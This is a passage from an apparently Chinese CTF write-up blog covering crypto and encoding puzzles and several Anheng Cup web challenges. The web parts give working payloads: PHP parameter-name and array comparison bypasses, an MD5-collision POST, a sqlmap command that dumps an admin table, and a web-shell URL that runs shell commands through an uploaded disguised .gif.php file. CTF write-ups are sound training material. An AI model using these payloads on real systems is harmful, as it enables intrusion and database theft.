class="string">'__main__'</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure></p><p>然后将enc保存起来为en文件<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">n = <span class="number">365848589691553391654453815696801609393691558975114732077589431735072735814004481321693204054611153742844719038444697593327493027785795731389621927670788503335861977736740530534583572225955976966446771693720421426616666151538067479984725761741317847115913974275314572559550814811157603376899910638368755166255776849626761808720772583206050387900451906315871548607212450421821284358760939660687558588799753487824506759639032283177034815892289194765173975342074810666614953387403646634191147782168926568900983361174986224868620163303631776464544385042160475855173792780028858673004579549168611488908206940265042017827224145445864849990033230038346962998044409425059655414595541354712964867076540952852074402602485254837693009606256646491881886402251519107628767780560029195077356603998621239496833842620813594476086809217145741837067697701029006079475655230057641122885601163764359304119539318186498359110652713132230601632984636292710845264886583673643096710521658506038045125724977714211793704349604343253187208130136333839351343850952892593409667791896415744436543839302830842902421646274217466522255794836216649020356914498443158290307092169834254304137975684324590877396301465368942446331758175055737212871262544202124864201404357</span></span><br><span class="line">q = <span class="number">21247215740957134093265550307601596334565934182288901633479787419858595507309542143291010899116196305518233534420568241312971809880837699847400521241640799368655041150575554308730271881769239094444859039192040949365669348829967204647597799647400611871600471392643211141324508902013965629910849583588860496396894218207070653018491227851599590460886901861118814380124225957234489558977546955544744088926474539812805322440263336981775000388601318263891815294818558967365443417213622344902893006222500539208416032217024199412011407065597780149434489493090516057515224711817526865207811206081845018578244352022299726352429</span></span><br><span class="line">p = <span class="number">17218660277747658661570321204242764803630206984608091050735513899954607259990197682920217962729554631925287717895042750367376053893825222669682720379767777978420372647078471394057423219108293122309702127813213538098587207320396013417905225613995163882055903136983578393368677405597005083234898687252223168153402377438770956193242614092327835450469896527227274247481162714635222596608814392174415700802919488373733075163465872659516094599061925501245246745540660613671330140533678955280470168225630164182057506377339944396256899408381867150087697255700045339651723565686838745271371156317781031620433061297464511939833</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = int(gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>)))</span><br><span class="line">c = <span class="number">595907910014897566676759273220494180110504405309206928262077375196851872198255475894354731091152236001815566589109149418500941957601976338444865345923284445575231525767013366811625019790193104404700935059348406110259409132999154793422284855871479573037198863168316139619015230842153164456415165712733168847053549666987429231550045602429647190887296150436097504253951033086041023290243394588112378415597355331197477353268041702315544498517593435582803377846605416492328428549762726997373778610297631262936044023082133389527010183648204602019909093544050106545010340111158865651714595416550877266379460461202508425081538939755155981052462387069127219471271252329219741973931444515475042747296537826297597609877185091023146800772255931184176842795811493106605043628420424570356086529035683658247137732622727936360278626896359520245649007121507751791963774871011757969835056581831379451191486773951068884218824708768124265822406883125206366165049254095060850508149142077001002691653724105471247840338330950732651135526020758912039445132132220384552395727000975811496722746325764235912590648009260905626046623587310131509221213855320504560598181447448347942432104726593025899197575968063366667049857458434444589861188997071804152577554008432377364384618217386050104523193905875708680446628674323881765587061198043253617150813946435891423000351453751011920626958050766691194569988935791651947014346084202733308461380228052483711867634858130530821103064974133728497007084932069068016812055942718671316269862791929104093268433719717198448532384887239504852113742140342891243245503616771575963935904547388496016245046067614357190925132118951805544371988522892491794366705168091658</span></span><br><span class="line">privatekey = rsa.PrivateKey(n,e,d,p,q)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"en"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(rsa.decrypt(base64.b64decode(f.read()),privatekey).decode())</span><br></pre></td></tr></table></figure></p><p>得到flag<br><code>flag{w3lC0M3_t0_rS4_w0RlD}</code></p><h2 id="安恒-奇怪的恐龙特性"><a href="#安恒-奇怪的恐龙特性" class="headerlink" title="安恒_奇怪的恐龙特性"></a>安恒_奇怪的恐龙特性</h2><p><a href="http://101.71.29.5:10009" target="_blank" rel="noopener">http://101.71.29.5:10009</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>;</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> A_A,too small</span><br></pre></td></tr></table></figure></p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/aaa/?p=222 (附带查询)</span><br><span class="line">结果：</span><br><span class="line">$_SERVER[&apos;QUERY_STRING&apos;] = &quot;p=222&quot;;</span><br><span class="line">$_SERVER[&apos;REQUEST_URI&apos;]  = &quot;/aaa/?p=222&quot;;</span><br><span class="line">$_SERVER[&apos;SCRIPT_NAME&apos;]  = &quot;/aaa/index.php&quot;;</span><br><span class="line">$_SERVER[&apos;PHP_SELF&apos;]     = &quot;/aaa/index.php&quot;;</span><br></pre></td></tr></table></figure><p>简单点解释就是当代码中存在<code>$_REQUEST[&#39;user_id&#39;]</code>里面类似的参数的时候，我们在url上可以这样<code>a.php?user.id</code>传参去进行绕过,这样进去之后也能表示<code>$_REQUEST[&#39;user_id&#39;]</code>的值，同样可以绕过的符号还有<code>+，[</code> 等，应该说是php的一个小特性，上面讲的很清楚了，</p><p>payload：<code>http://101.71.29.5:10007/?A+A[]=admin</code></p><h2 id="loli"><a href="#loli" class="headerlink" title="loli"></a>loli</h2><p>想到使用0xFF异或整个文件，脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./1.png'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f, open(<span class="string">'xor.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> wf:</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> f.read():</span><br><span class="line">            wf.write(chr(ord(each) ^ <span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    xor()</span><br></pre></td></tr></table></figure></p><h2 id="play-fair加密-关键字公平"><a href="#play-fair加密-关键字公平" class="headerlink" title="play fair加密(关键字公平)"></a>play fair加密(关键字公平)</h2><p><a href="http://www.practicalcryptography.com/ciphers/classical-era/playfair/" target="_blank" rel="noopener">http://www.practicalcryptography.com/ciphers/classical-era/playfair/</a></p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><blockquote><p>vv公司称，他们给出了最为公平的游戏规则，你能猜到是什么吗？ 规则：FMGKYBXTSFBNCQDSPT，附件：ZKLIPOAGSUMDWFHCBVTRYENXQ. 答案的格式是key{xxxxx}，xxx为解密内容大写，所以答案是</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># python3</span><br><span class="line"># 在所在pycipher模块下导入</span><br><span class="line">&gt;&gt;&gt; from pycipher import Playfair</span><br><span class="line"> &gt;&gt;&gt; Playfair(&apos;ZKLIPOAGSUMDWFHCBVTRYENXQ&apos;).decipher(&apos;FMGKYBXTSFBNCQDSPT&apos;) &apos;WHALECTFISVERYFAIR&apos;</span><br></pre></td></tr></table></figure><h2 id="rfc4042"><a href="#rfc4042" class="headerlink" title="rfc4042"></a>rfc4042</h2><p>utf-9编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># python2</span><br><span class="line">import utf9</span><br><span class="line">f1 = open(&apos;flag_is_here_rfc4042&apos;,&apos;r&apos;)</span><br><span class="line">f2 = open(&apos;flag.txt&apos;,&apos;w&apos;)</span><br><span class="line">str1 = f1.read()</span><br><span class="line">print utf9.utf9decode(str1)</span><br><span class="line">f2.write(utf9.utf9decode(str1))</span><br><span class="line">f1.close()</span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_____*((__//__+___+______-____%____)**((___%(___-_))+________+(___%___+_____+_______%__+______-(______//(_____%___)))))+__*(((________/__)+___%__+_______-(________//____))**(_*(_____+_____)+_______+_________%___))+________*(((_________//__+________%__)+(_______-_))**((___+_______)+_________-(______//__)))+_______*((___+_________-(______//___-_______%__%_))**(_____+_____+_____))+__*(__+_________-(___//___-_________%_____%__))**(_________-____+_______)+(___+_______)**(________%___%__+_____+______)+(_____-__)*((____//____-_____%____%_)+_________)**(_____-(_______//_______+_________%___)+______)+(_____+(_________%_______)*__+_)**_________+_______*(((_________%_______)*__+_______-(________//________))**_______)+(________/__)*(((____-_+_______)*(______+____))**___)+___*((__+_________-_)**_____)+___*(((___+_______-______/___+__-_________%_____%__)*(___-_+________/__+_________%_____))**__)+(_//_)*(((________%___%__+_____+_____)%______)+_______-_)**___+_____*((______/(_____%___))+_______)*((_________%_______)*__+_____+_)+___//___+_________+_________/___</span><br></pre></td></tr></table></figure></p><p>使用脚本解密<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">_ = <span class="number">1</span></span><br><span class="line">__ = <span class="number">2</span></span><br><span class="line">___ = <span class="number">3</span></span><br><span class="line">____ = <span class="number">4</span></span><br><span class="line">_____ = <span class="number">5</span></span><br><span class="line">______ = <span class="number">6</span></span><br><span class="line">_______ = <span class="number">7</span></span><br><span class="line">________ = <span class="number">8</span></span><br><span class="line">_________ = <span class="number">9</span></span><br><span class="line">f = open(<span class="string">'flag.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">a = f.read()</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure></p><p>得到一串数字<code>5287002131074331513</code><br>转换成16进制为<code>495f346d2d6b3379</code><br>转换成字符串就是最后的<code>flagI_4m-k3y</code></p><p>python中16进制转ascii代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="comment">#16进制整数转ASCii编码字符串</span></span><br><span class="line">a = <span class="number">0x665554</span></span><br><span class="line">b = hex(a)  <span class="comment">#转换成相同的字符串即'0x665554'</span></span><br><span class="line">b = b[<span class="number">2</span>:]   <span class="comment">#截取掉'0x'</span></span><br><span class="line">c = binascii.a2b_hex(b) <span class="comment">#转换成ASCii编码的字符串</span></span><br></pre></td></tr></table></figure></p><p>这里我们使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [2]: import binascii</span><br><span class="line">In [3]: a = &apos;495f346d2d6b3379&apos;</span><br><span class="line">In [4]: print(binascii.a2b_hex(a))</span><br><span class="line">I_4m-k3y</span><br></pre></td></tr></table></figure></p><p>ASCii编码字符串转十六进制整数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">c = <span class="string">'fUT'</span></span><br><span class="line">e = <span class="number">0</span>   <span class="comment">#暂存结果</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    d = ord(i)  <span class="comment">#单个字符转换成ASCii码</span></span><br><span class="line">    e = e*<span class="number">256</span> + d   <span class="comment">#将单个字符转换成的ASCii码相连</span></span><br><span class="line">print(<span class="string">"e:%x"</span> %e)</span><br><span class="line"><span class="keyword">print</span> type(e)</span><br></pre></td></tr></table></figure></p><h2 id="kill-2016全国大学生信息安全竞赛"><a href="#kill-2016全国大学生信息安全竞赛" class="headerlink" title="kill(2016全国大学生信息安全竞赛)"></a>kill(2016全国大学生信息安全竞赛)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">threst@threst:~/下载$ strings kill.pcapng | grep flag</span><br><span class="line">=flag&#123;roses_r_blue_violets_r_r3d_mayb3_harambae_is_not_kill&#125;</span><br></pre></td></tr></table></figure><h2 id="2018“安恒杯”Web安全测试大赛（秋季预选赛）"><a href="#2018“安恒杯”Web安全测试大赛（秋季预选赛）" class="headerlink" title="2018“安恒杯”Web安全测试大赛（秋季预选赛）"></a>2018“安恒杯”Web安全测试大赛（秋季预选赛）</h2><h4 id="输入试试"><a href="#输入试试" class="headerlink" title="输入试试"></a>输入试试</h4><p><a href="http://114.55.36.69:8003" target="_blank" rel="noopener">http://114.55.36.69:8003</a><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Input<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"flag"</span> <span class="attr">style</span>=<span class="string">"width: 200px;margin-left: 100px;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">"check();"</span> <span class="attr">value</span>=<span class="string">"提交"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> flag = <span class="built_in">document</span>.getElementById(<span class="string">"flag"</span>).value;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> str = <span class="string">"d84d9657e5e5e"</span> || <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> str = str + (<span class="string">"ad2ad3fe"</span> &amp;&amp; <span class="number">2</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> str = str + <span class="string">"a2da9494b8"</span> + <span class="string">"ddea4fd4"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> str = str.split(<span class="string">""</span>).reverse().join(<span class="string">""</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (str == flag)&#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">"恭喜你已经找到flag！"</span>);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>直接控制台<br>flag:<code>4df4aedd8b4949ad2a2e5e5e7569d48d</code></p><h2 id="简单的md5"><a href="#简单的md5" class="headerlink" title="简单的md5"></a>简单的md5</h2><p>简单的md5 <a href="http://114.55.36.69:8004" target="_blank" rel="noopener">http://114.55.36.69:8004</a></p><p>源码:<code>easy MD5 cracking &lt;!--$_POST[&#39;data1&#39;]!=$_POST[&#39;data2&#39;]--&gt;fail</code><br>payload:<code>data1[]=1&amp;data2[]=2</code><br>flag{401cf19d304e557349fecda18110c138}</p><h2 id="传个flag试试"><a href="#传个flag试试" class="headerlink" title="传个flag试试"></a>传个flag试试</h2><p><a href="http://114.55.36.69:8012" target="_blank" rel="noopener">http://114.55.36.69:8012</a></p><p>随便ｐｏｓｔ一个ｆｌａｇ参数，提示要１０位以上，提交十位以上直接出答案</p><p>flag{858a14671c27804b63e6e96b0acdfdd7}</p><h2 id="md5-crash"><a href="#md5-crash" class="headerlink" title="md5 crash"></a>md5 crash</h2><p><a href="http://114.55.36.69:8006" target="_blank" rel="noopener">http://114.55.36.69:8006</a></p><p>源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5 cracking&lt;!-- if((string)$_POST[&apos;data1&apos;]!==(string)$_POST[&apos;data2&apos;]&amp;&amp;md5($_POST[&apos;data1&apos;])===md5($_POST[&apos;data2&apos;]))--&gt;fail</span><br></pre></td></tr></table></figure></p><p>payload:<code>data1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;data2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></p><p>flag:<code>flag{9bd1ee7355b58e53214adb9a37b4cb82}</code></p><h2 id="简单的新闻搜索网站"><a href="#简单的新闻搜索网站" class="headerlink" title="简单的新闻搜索网站"></a>简单的新闻搜索网站</h2><p><a href="http://114.55.36.69:8010" target="_blank" rel="noopener">http://114.55.36.69:8010</a></p><p>保存请求包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 114.55.36.69:8010</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://114.55.36.69:8010/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 17</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">word=123&amp;number=5</span><br></pre></td></tr></table></figure></p><p>paylload:<code>sqlmap -r burp.txt -D news -T admin --dump</code></p><p>flag:<code>flag{f98505d1d12f50a0bd9463e90876630}</code></p><h2 id="省赛添加"><a href="#省赛添加" class="headerlink" title="省赛添加"></a>省赛添加</h2><p><a href="http://www.camser.top/2018/06/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9Bweb%E7%AF%87/#ezupload" target="_blank" rel="noopener">http://www.camser.top/2018/06/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9Bweb%E7%AF%87/#ezupload</a></p><p><a href="http://114.55.36.69:8015/uploads/550d7c7c2a0c1d0dc373959b7d403de1d6783582/test.gif.php?code=cat%20../../dc9d7b225e0a391fb028fb337ffd1c1d/f14g" target="_blank" rel="noopener">http://114.55.36.69:8015/uploads/550d7c7c2a0c1d0dc373959b7d403de1d6783582/test.gif.php?code=cat%20../../dc9d7b225e0a391fb028fb337ffd1c1d/f14g</a></p><p>/tmp/upload_td5pr76p91efjs5qcuad4b0q52/<br>/tmp/upload_ru3o7d9kqb8a14jp0fc2m4a7u5/<br>/tmp/upload_ru3o7d9kqb8a14jp0fc2m4a7u5/<br>/tmp/upload_ru3o7d9kqb8a14jp0fc2m4a7u5/<br>/tmp/upload_2e5g1d0qainrjqm7se8nv4ife2/</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleZip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $za;</span><br><span class="line">    <span class="keyword">public</span> $debug;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file, $debug = false)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;debug = $debug;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;za = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;za-&gt;open(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;debug)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Open file &#123;$this-&gt;file&#125;\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">iszip</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;za-&gt;open(<span class="keyword">$this</span>-&gt;file) === <span class="keyword">true</span>)?<span class="keyword">true</span>:<span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">extract</span><span class="params">($dir, $exclude = array<span class="params">()</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;iszip() === <span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="keyword">$this</span>-&gt;za-&gt;numFiles; $i++) &#123;</span><br><span class="line">                $filename = <span class="keyword">$this</span>-&gt;za-&gt;getNameIndex($i);</span><br><span class="line">                <span class="keyword">if</span>(in_array(basename($filename), $exclude))&#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                $pathinfo = pathinfo($filename);</span><br><span class="line">                <span class="keyword">if</span>(!file_exists($dir.<span class="string">'/'</span>.$pathinfo[<span 